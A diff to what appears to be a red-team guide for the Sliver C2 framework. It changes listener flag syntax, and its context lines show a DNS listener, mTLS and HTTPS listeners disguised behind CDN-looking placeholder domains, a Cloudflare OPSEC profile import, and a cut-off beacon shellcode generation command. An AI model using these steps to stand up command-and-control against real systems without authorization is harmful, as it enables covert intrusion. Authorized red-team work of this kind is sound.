@@ -168,8 +168,8 @@ sliver > dns --domains c2.yourdomain.com --lport 53
 
 **Recommended Setup** - mTLS as primary + HTTPS as failover:
 ```
-sliver > mtls -l 0.0.0.0 -p 8888
-sliver > https -l 0.0.0.0 -p 443 -d cdn-assets.yourdomain.com
+sliver > mtls --lhost 0.0.0.0 --lport 8888
+sliver > https --lhost 0.0.0.0 --lport 443 -d cdn-assets.yourdomain.com
 ```
 
 ---
@@ -460,8 +460,8 @@ make
 c2profiles import -n cloudflare -f opsec-profiles/cloudflare-cdn-c2.json
 
 # 4. Start listeners
-mtls -l 0.0.0.0 -p 8888
-https -l 0.0.0.0 -p 443 -d cdn.yourdomain.com
+mtls --lhost 0.0.0.0 --lport 8888
+https --lhost 0.0.0.0 --lport 443 -d cdn.yourdomain.com
 
 # 5. Generate shellcode
 generate beacon --mtls IP:8888 --http https://cdn.yourdomain.com \
